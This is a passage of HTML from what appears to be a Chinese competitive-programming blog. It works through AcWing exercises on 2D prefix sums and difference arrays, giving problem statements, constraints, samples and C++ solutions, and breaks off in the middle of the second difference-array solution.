encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 个询问，每个询问包含四个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示一个子矩阵的左上角坐标和右下角坐标。</p><p>对于每个询问输出子矩阵中所有数的和。</p><p><strong>输入格式</strong></p><p>第一行包含三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mtext>，</mtext><mi>m</mi><mtext>，</mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">n，m，q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个整数，表示整数矩阵。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 行，每行包含四个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示一组询问。</p><p><strong>输出格式</strong></p><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 行，每行输出一个询问的结果。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>q</mi><mo>≤</mo><mn>200000</mn></mrow><annotation encoding="application/x-tex">1 \le q \le 200000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">200000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><msub><mi>x</mi><mn>1</mn></msub><mo>≤</mo><msub><mi>x</mi><mn>2</mn></msub><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le x_1 \le x_2 \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><msub><mi>y</mi><mn>1</mn></msub><mo>≤</mo><msub><mi>y</mi><mn>2</mn></msub><mo>≤</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1 \le y_1 \le y_2 \le m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mtext>矩阵内元素的值</mtext><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le 矩阵内元素的值 \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">矩阵内元素的值</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>3 4 31 7 2 43 6 2 82 1 2 31 1 2 22 1 3 41 3 3 4</code></pre><p><strong>输出样例：</strong></p><pre><code>172721</code></pre><h3 id="二维前缀和">二维前缀和</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> s[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, q;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i][j]);</span><br><span class="line">      s[i][j] += s[i - <span class="number">1</span>][j] + s[i][j - <span class="number">1</span>] - s[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">    <span class="type">int</span> x1, y1, x2, y2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[x2][y2] - s[x1 - <span class="number">1</span>][y2] - s[x2][y1 - <span class="number">1</span>] + s[x1 - <span class="number">1</span>][y1 - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-797-差分"><a href="https://www.acwing.com/problem/content/799/">AcWing 797. 差分</a></h2><p>输入一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数序列。</p><p>接下来输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个操作，每个操作包含三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo separator="true">,</mo><mi>r</mi><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">l, r, c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>，表示将序列中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>l</mi><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[l, r]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">]</span></span></span></span> 之间的每个数加上 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>。</p><p>请你输出进行完所有操作后的序列。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示整数序列。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行包含三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mtext>，</mtext><mi>r</mi><mtext>，</mtext><mi>c</mi></mrow><annotation encoding="application/x-tex">l，r，c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">c</span></span></span></span>，表示一个操作。</p><p><strong>输出格式</strong></p><p>共一行，包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示最终序列。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>l</mi><mo>≤</mo><mi>r</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le l \le r \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mi>c</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le c \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mtext>整数序列中元素的值</mtext><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le 整数序列中元素的值 \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">整数序列中元素的值</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>6 31 2 2 1 2 11 3 13 5 11 6 1</code></pre><p><strong>输出样例：</strong></p><pre><code>3 4 5 3 4 2</code></pre><h3 id="法1-b-i-a-i-a-i-1">法1 b[i] = a[i] - a[i - 1]</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    b[i] = a[i] - a[i - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">    b[l] += c;</span><br><span class="line">    b[r + <span class="number">1</span>] -= c;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    b[i] += b[i - <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="法2-通过insert-初始化b-i">法2 通过insert()初始化b[i]</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 